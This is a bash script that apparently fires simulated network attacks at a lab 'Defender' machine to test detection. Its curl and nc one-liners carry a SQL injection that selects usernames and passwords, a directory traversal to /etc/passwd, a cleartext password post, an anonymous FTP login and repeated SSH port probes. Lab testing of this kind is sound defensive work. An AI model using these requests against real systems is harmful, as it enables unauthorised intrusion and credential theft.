#!/bin/bash
# Description: Automates the execution of the network attacks.

# IMPORTANT: Set the target IP of your Defender machine here
TARGET="<IP>"

echo "=========================================="
echo " Starting Attack Simulation against $TARGET"
echo "=========================================="

echo "[1/6] Firing Large ICMP Packet..."
ping -s 900 -c 1 $TARGET > /dev/null

echo "[2/6] Firing SQL Injection..."
curl -s -A "Mozilla/5.0" "http://$TARGET/?id=1+UNION+SELECT+username,password+FROM+users" > /dev/null

echo "[3/6] Firing Directory Traversal..."
curl -s --path-as-is -A "Mozilla/5.0" "http://$TARGET/../../../../etc/passwd" > /dev/null

echo "[4/6] Firing Cleartext Password..."
curl -s -X POST -d "password=SuperSecret123" "http://$TARGET/login" > /dev/null

echo "[5/6] Firing FTP Anonymous Login..."
(echo -ne "USER anonymous\r\n"; sleep 1) | nc -w 1 $TARGET 21 > /dev/null

echo "[6/6] Firing SSH Brute Force (6 attempts)..."
for i in {1..6}; do nc -w 1 -z $TARGET 22; done
